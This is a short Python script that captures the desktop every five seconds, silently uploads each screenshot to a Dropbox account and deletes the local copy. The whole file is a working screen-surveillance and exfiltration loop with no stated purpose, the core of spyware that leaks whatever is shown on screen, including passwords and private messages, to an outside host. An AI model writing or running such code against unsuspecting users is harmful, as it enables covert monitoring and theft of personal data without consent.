import pyscreenshot as ImageGrab
import dropbox
from datetime import datetime
import os
import threading


dbx = dropbox.Dropbox('')

def main():
    threading.Timer(5.0, main).start()
    image = grab_desktop_image()
    get_dropbox_credentials()
    upload_image(image)
    remove_image(image)
    
def grab_desktop_image():
    im=ImageGrab.grab()
    dt = datetime.now()
    fname = "pic_{}.{}.png".format(dt.strftime("%H%M_%S"), dt.microsecond // 100000)
    im.save(fname, 'png')

    return fname


def remove_image(image):
    try:
        os.remove("./" + image)
    except:
        print('something broke')

def get_dropbox_credentials():
    creds = dbx.users_get_current_account()

def upload_image(file_name):
    dropbox_path='/'
    with open(file_name, 'rb') as f:
        dbx.files_upload(f.read(),dropbox_path+file_name,mute=True)


if __name__ == '__main__':
    main()
